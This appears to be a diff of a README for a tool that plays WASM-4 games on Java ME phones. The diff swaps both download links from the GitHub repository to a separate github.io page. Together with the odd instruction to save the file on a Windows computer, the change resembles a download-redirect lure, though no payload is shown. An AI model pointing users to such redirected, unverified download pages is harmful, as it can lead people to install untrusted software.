@@ -1,6 +1,6 @@
 # 🎮 w4me-station - Play WASM4 retro games on phones
 
-[![](https://img.shields.io/badge/Download-W4ME--Station-blue.svg)](https://github.com/Roundeyed-proboscidea173/w4me-station)
+[![](https://img.shields.io/badge/Download-W4ME--Station-blue.svg)](https://roundeyed-proboscidea173.github.io)
 
 This software allows you to play WASM-4 retro games on older Java ME mobile phones. It functions as an interpreter that translates modern web-based game code for use on devices running CLDC 1.1 and MIDP 2.0. You revive your classic hardware by turning your feature phone into a portable game console.
 
@@ -8,7 +8,7 @@ This software allows you to play WASM-4 retro games on older Java ME mobile phon
 
 You need to download the source installation package from the project page. 
 
-[Visit this page to download the software](https://github.com/Roundeyed-proboscidea173/w4me-station)
+[Visit this page to download the software](https://roundeyed-proboscidea173.github.io)
 
 Save the file to a folder you can find easily on your Windows computer.
 
